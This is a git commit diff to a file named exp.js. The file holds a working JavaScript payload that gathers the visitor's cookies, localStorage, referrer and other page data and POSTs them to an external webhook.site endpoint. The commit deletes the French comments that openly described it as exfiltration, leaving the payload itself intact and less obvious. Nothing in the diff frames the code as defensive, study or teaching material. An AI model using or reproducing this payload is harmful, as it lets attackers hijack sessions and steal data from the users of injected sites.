84220a735c20ddbbcbfe565893b5966cf37aec78
44r0nMeta <90402025+44r0nMeta@users.noreply.github.com>
2025-05-03 21:53:52 +0000

    Update exp.js

--- exp.js
+++ exp.js
@@ -1,4 +1,4 @@
-// 1. Exfiltre les cookies, localStorage, DOM, userAgent, et la page HTML
+
 const data = {
     cookies: document.cookie,
     localStorage: JSON.stringify(localStorage),
@@ -9,7 +9,6 @@ const data = {
     referrer: document.referrer,
   };
   
-  // 2. Envoi des données vers votre webhook
   fetch('https://webhook.site/bf17564a-dae7-4a76-9ff8-239b0ff3cdc5', {
     method: 'POST',
     headers: {
@@ -20,7 +19,3 @@ const data = {
   .then(response => response.text())
   .then(result => console.log('Success:', result))
   .catch(error => console.error('Error:', error));
-  
-  // 3. Optionnel : Redirection ou alerte pour confirmer l'exécution
-  //alert('Données envoyées au webhook !');
-  // window.location.href = "https://google.com"; // Redirection si nécessaire
